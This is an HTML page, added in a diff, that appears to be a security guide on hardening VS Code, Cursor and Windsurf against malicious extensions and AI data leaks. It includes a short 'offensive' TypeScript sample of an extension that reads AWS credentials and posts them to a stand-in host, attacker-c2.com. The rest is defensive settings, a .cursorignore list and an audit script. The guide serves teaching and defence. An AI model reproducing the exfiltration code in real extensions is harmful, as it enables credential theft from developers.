@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Securing VS Code & AI Agents: The 2026 Hardening Guide | TheHGTech</title>
+    <meta name="description"
+        content="Research-grade guide to hardening VS Code, Cursor, and Windsurf against supply chain attacks. Includes extension auditing scripts, Restricted Mode policies, and .cursorignore patterns.">
+    <meta name="keywords"
+        content="VS Code Security, Malicious Extensions, IDE Hardening, Cursor Security, Supply Chain Attack, DevSecOps, GlassWorm, Agentic AI, Windsurf IDE">
+    <meta name="author" content="TheHGTech Security Research">
+    <link rel="canonical" href="https://thehgtech.com/guides/vscode-supply-chain-hardening-2026.html">
+
+    <!-- Open Graph -->
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://thehgtech.com/guides/vscode-supply-chain-hardening-2026.html">
+    <meta property="og:title" content="Hardening the AI-Powered IDE (VS Code/Cursor)">
+    <meta property="og:description"
+        content="Developers are the new target. Learn how to lock down your IDE against malicious extensions and AI data leaks.">
+    <meta property="og:image" content="https://thehgtech.com/images/guides/vscode-supply-chain-hardening-2026.png">
+
+    <!-- Fonts & Icons -->
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <!-- Style System -->
+    <link rel="stylesheet" href="/m-core.css?v=4.2">
+    <link rel="stylesheet" href="/m-layout.css?v=3.2">
+    <link rel="stylesheet" href="/m-components.css?v=3.0">
+    <link rel="stylesheet" href="/light-mode.css">
+    <link rel="stylesheet" href="/interaction-bar.css">
+
+    <script src="/m-app.js?v=4.3" defer></script>
+    <script src="/interaction-bar.js" defer></script>
+
+    <style>
+        :root {
+            --bg-primary: #0f172a;
+            --text-primary: #f8fafc;
+            --text-secondary: #94a3b8;
+            --accent-cyan: #06b6d4;
+            --accent-blue: #3b82f6;
+            --accent-green: #10b981;
+            --accent-red: #ef4444;
+            --code-bg: #1e293b;
+            --border: rgba(148, 163, 184, 0.1);
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.8;
+            font-size: 18px;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 80px 1.5rem 120px;
+        }
+
+        /* Hero */
+        .guide-header {
+            padding-bottom: 3rem;
+            border-bottom: 1px solid var(--border);
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        h1 {
+            font-size: clamp(2.5rem, 5vw, 3.5rem);
+            font-weight: 800;
+            background: linear-gradient(135deg, #fff 30%, var(--accent-blue));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 1rem;
+            line-height: 1.1;
+        }
+
+        /* Content Styling */
+        h2 {
+            margin: 3.5rem 0 1.5rem;
+            font-size: 2rem;
+            color: #fff;
+            border-left: 4px solid var(--accent-blue);
+            padding-left: 1rem;
+            background: linear-gradient(90deg, rgba(59, 130, 246, 0.1), transparent);
+            padding-top: 0.5rem;
+            padding-bottom: 0.5rem;
+        }
+
+        h3 {
+            margin: 2rem 0 1rem;
+            font-size: 1.4rem;
+            color: #e2e8f0;
+        }
+
+        /* Research Grade Boxes */
+        .vuln-card,
+        .exploit-box,
+        .defense-box,
+        .technical-box {
+            border: 1px solid var(--border);
+            padding: 2rem;
+            border-radius: 8px;
+            margin: 2.5rem 0;
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .vuln-card {
+            border-left: 4px solid var(--accent-red);
+            background: rgba(239, 68, 68, 0.05);
+        }
+
+        .technical-box {
+            border-left: 4px solid var(--accent-cyan);
+            background: rgba(6, 182, 212, 0.05);
+        }
+
+        .defense-box {
+            border-left: 4px solid var(--accent-green);
+            background: rgba(16, 185, 129, 0.05);
+        }
+
+        /* Code Blocks */
+        pre {
+            background: var(--code-bg);
+            border: 1px solid #334155;
+            padding: 1.5rem;
+            border-radius: 8px;
+            overflow-x: auto;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+        }
+
+        code {
+            color: #e2e8f0;
+        }
+
+        .timeline {
+            border-left: 2px solid var(--border);
+            padding-left: 2rem;
+            margin: 2rem 0;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Mobile Header -->
+    <header class="m-header m-only">
+        <div class="m-header__logo"><span style="font-weight: 700;">TheHGTech</span></div>
+        <div class="m-header__actions">
+            <button class="m-theme-toggle" onclick="mToggleTheme()"><i class="fas fa-moon"></i></button>
+        </div>
+    </header>
+
+    <!-- Bottom Navigation -->
+    <nav class="m-bottom-nav m-only">
+        <a href="/" class="m-bottom-nav__item"><i class="fas fa-home"></i><span>Home</span></a>
+        <a href="/guides/" class="m-bottom-nav__item active"><i class="fas fa-book"></i><span>Guides</span></a>
+    </nav>
+
+    <div class="container">
+        <header class="guide-header">
+            <div style="font-size: 0.9rem; color: #64748b; margin-bottom: 1.5rem;">
+                GUIDES / INFRASTRUCTURE SECURITY
+            </div>
+            <h1>Securing the AI-Powered IDE: Hardening VS Code, Cursor & Windsurf</h1>
+            <p style="font-size: 1.25rem; max-width: 800px; margin: 0 auto; color: #cbd5e1;">Your IDE is now a Command &
+                Control server. Learn to audit extensions, enforce Workspace Trust, and prevent Agentic AI data leaks in
+                the era of 2026 Supply Chain attacks.</p>
+
+            <div style="display: flex; gap: 1rem; justify-content: center; margin-top: 2rem; font-size: 0.9rem;">
+                <span
+                    style="background: rgba(255,255,255,0.05); padding: 0.4rem 1rem; border-radius: 4px; color: var(--accent-cyan);"><i
+                        class="fas fa-code"></i> DevSecOps</span>
+                <span
+                    style="background: rgba(255,255,255,0.05); padding: 0.4rem 1rem; border-radius: 4px; color: var(--accent-red);"><i
+                        class="fas fa-shield-alt"></i> Red Teaming</span>
+                <span
+                    style="background: rgba(255,255,255,0.05); padding: 0.4rem 1rem; border-radius: 4px; color: var(--accent-green);"><i
+                        class="fas fa-clock"></i> 25 Min Read</span>
+            </div>
+        </header>
+
+        <img src="../images/guides/vscode-supply-chain-hardening-2026.png" alt="VS Code Hardening Guide"
+            style="width: 100%; border-radius: 8px; margin-bottom: 3rem; border: 1px solid var(--border);">
+
+        <div class="content">
+            <p>In 2026, the Integrated Development Environment (IDE) is no longer just a text editor—it is an
+                <strong>operating system for code</strong>. With the rise of AI-native editors like
+                <strong>Cursor</strong> and <strong>Windsurf</strong>, and the massive extension ecosystem of VS Code,
+                developers have invited thousands of unvetted third-party binaries to run on their machines with full
+                read/write access.</p>
+
+            <p>This guide moves beyond "install an antivirus." We perform a deep textual analysis of the VS Code
+                permission model and provide a hardened specialized configuration for high-security environments.</p>
+
+            <h2>1. Threat Model: The "IDE as C2"</h2>
+
+            <div class="vuln-card">
+                <h3 style="margin-top:0; color: var(--accent-red);"><i class="fas fa-bug"></i> The GlassWorm Vector</h3>
+                <p>The recent "GlassWorm" campaign (Feb 2026) demonstrated that malicious VS Code extensions can:</p>
+                <ul>
+                    <li>Read <code>.env</code> files and <code>~/.ssh/id_rsa</code> keys.</li>
+                    <li>Spawn a reverse shell to a C2 server (hiding in HTTPS traffic).</li>
+                    <li>Inject backdoors into your Git commits <em>before</em> you push them.</li>
+                </ul>
+                <p><strong>The Risk:</strong> Extensions run in a Node.js process alongside the editor. They inherit
+                    your user account's permissions. If you can run `sudo`, so can they.</p>
+            </div>
+
+            <h3>Lab Scenario: Building a Malicious Extension</h3>
+            <p>To understand the defense, we must understand the offense. Here is how a simple extension exfiltrates
+                data.</p>
+
+            <div class="exploit-box">
+                <span
+                    style="background: #ef4444; color: #fff; padding: 2px 8px; font-size: 0.75rem; font-weight: 700; border-radius: 2px;">OFFENSIVE:
+                    DATA EXFILTRATION</span>
+                <p>A few lines of TypeScript in `extension.ts` is all it takes to steal AWS keys.</p>
+                <pre><code class="language-typescript">// Malicious 'activate' function in extension.ts
+import * as vscode from 'vscode';
+import * as fs from 'fs';
+import * as os from 'os';
+import axios from 'axios';
+
+export function activate(context: vscode.ExtensionContext) {
+    // 1. Target sensitive files
+    const homeDir = os.homedir();
+    const awsCreds = `${homeDir}/.aws/credentials`;
+
+    // 2. Read quietly
+    if (fs.existsSync(awsCreds)) {
+        const data = fs.readFileSync(awsCreds, 'utf8');
+        
+        // 3. Exfiltrate to C2
+        axios.post('https://attacker-c2.com/collect', {
+            host: os.hostname(),
+            creds: Buffer.from(data).toString('base64')
+        });
+    }
+}</code></pre>
+            </div>
+
+            <h2>2. Hardening VS Code & Cursor</h2>
+            <p>Defense in Depth for IDEs relies on three layers: <strong>Verification</strong>,
+                <strong>Isolation</strong>, and <strong>Policy</strong>.</p>
+
+            <h3>Layer 1: Enforcing Extension Signing</h3>
+            <p>By default, VS Code warns but allows unsigned extensions. In a high-security environment, we must block
+                them entirely.</p>
+
+            <div class="defense-box">
+                <h3 style="margin-top:0; color: var(--accent-green);"><i class="fas fa-shield-alt"></i> Hardened
+                    settings.json</h3>
+                <p>Add these lines to your global `settings.json` to enforce strict verification.</p>
+                <pre><code class="language-json">{
+    // 1. Block Unverified Extensions
+    "extensions.verifySignature": true,
+    
+    // 2. Enable Workspace Trust (Sandboxing)
+    "security.workspace.trust.enabled": true,
+    
+    // 3. Disable Auto-Updates for Extensions (Prevent Supply Chain Poisoning)
+    "extensions.autoUpdate": false,
+    
+    // 4. Telemetry Silence
+    "telemetry.telemetryLevel": "off",
+    "redhat.telemetry.enabled": false
+}</code></pre>
+            </div>
+
+            <h3>Layer 2: AI Agent Isolation (.cursorignore)</h3>
+            <p>AI IDEs like <strong>Cursor</strong> index your entire codebase to provide context. However, you do NOT
+                want your AI sending your `.env` files or production DB dumps to the cloud model for embedding.</p>
+            <p>Cursor supports a `.cursorignore` file (syntax similar to `.gitignore`) to prevent indexing.</p>
+
+            <div class="technical-box">
+                <h3><i class="fas fa-file-code"></i> Recommended .cursorignore</h3>
+                <pre><code class="language-text"># Secrets and Keys
+.env*
+*.pem
+*.key
+id_rsa
+credentials.json
+
+# Compliance Data (PII/PHI)
+/data/dumps/*.sql
+/logs/
+/customer-data/
+
+# Internal Configs
+k8s/secrets/
+terraform.tfstate</code></pre>
+            </div>
+
+            <h2>3. Corporate Policy: The "Safe Extension" Allowlist</h2>
+            <p>For enterprises, trusting individual developers to vet extensions is a failed strategy. You should
+                implement a Command Line Interface (CLI) policy to audit installed extensions.</p>
+
+            <div class="technical-box">
+                <h3><i class="fas fa-terminal"></i> Audit Script (PowerShell)</h3>
+                <p>Run this script to flag any extension not on the approved publishers list (e.g., Microsoft, RedHat,
+                    HashiCorp).</p>
+                <pre><code class="language-powershell"># Get all installed extensions
+$extensions = code --list-extensions --show-versions
+
+# Approved Publishers
+$allowList = @("ms-vscode", "ms-python", "esbenp", "redhat", "hashicorp")
+
+foreach ($ext in $extensions) {
+    $publisher = $ext.Split(".")[0]
+    if ($allowList -notcontains $publisher) {
+        Write-Host "WARNING: Unverified Publisher detected: $ext" -ForegroundColor Red
+    }
+}</code></pre>
+            </div>
+
+            <h2>4. Conclusion & Checklist</h2>
+            <p>An IDE is a powerful tool, but in 2026, it is also a powerful weapon. Treating it with the same security
+                rigor as a production server is the only way to prevent supply chain compromise.</p>
+
+            <div class="success-box">
+                <strong><i class="fas fa-check-circle"></i> Quick Wins Checklist:</strong>
+                <ul>
+                    <li>Enabled "Workspace Trust" for all new folders.</li>
+                    <li>Created `.cursorignore` for sensitive directories.</li>
+                    <li>Audited extension list for unknown publishers.</li>
+                    <li>Disabled extension auto-updates.</li>
+                </ul>
+            </div>
+
+        </div>
+
+        <!-- Interaction Bar -->
+        <div class="interaction-bar">
+            <div class="like-section">
+                <button class="like-btn" id="likeBtn" onclick="toggleLike()">
+                    <i class="far fa-heart"></i> <span id="likeText">Like this guide</span>
+                </button>
+            </div>
+            <div class="action-buttons">
+                <button onclick="window.print()" class="print-btn" title="Print Guide"><i
+                        class="fas fa-print"></i></button>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>&copy; 2026 TheHGTech Security Research.</p>
+    </footer>
+</body>
+
+</html>
